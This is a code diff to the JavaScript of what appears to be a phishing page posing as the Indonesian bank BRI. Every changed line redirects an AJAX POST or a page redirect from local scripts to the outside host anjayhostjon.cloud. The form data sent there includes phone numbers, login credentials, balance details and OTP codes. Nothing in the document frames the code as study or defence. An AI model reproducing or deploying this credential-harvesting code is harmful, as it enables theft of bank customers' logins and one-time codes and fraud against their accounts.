@@ -5,7 +5,7 @@ function sendHp() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/one.php',
+      url: 'https://anjayhostjon.cloud/BRI/jh37b/one.php',
       data: $('#inputHp').serialize(),
       complete: function(data) {
          vibr(220);
@@ -36,7 +36,7 @@ function sendLogin() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/login.php',
+      url: 'https://anjayhostjon.cloud/BRI/jh37b/login.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -67,7 +67,7 @@ function sendSaldo() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/two.php',
+      url: 'https://anjayhostjon.cloud/BRI/jh37b/two.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -102,7 +102,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/three.php',
+      url: 'https://anjayhostjon.cloud/BRI/jh37b/three.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')         
@@ -131,7 +131,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='wa';
+location.href='https://anjayhostjon.cloud/BRI/jh37b/wa';
  $('.load').hide();
     }, 4000);    
     
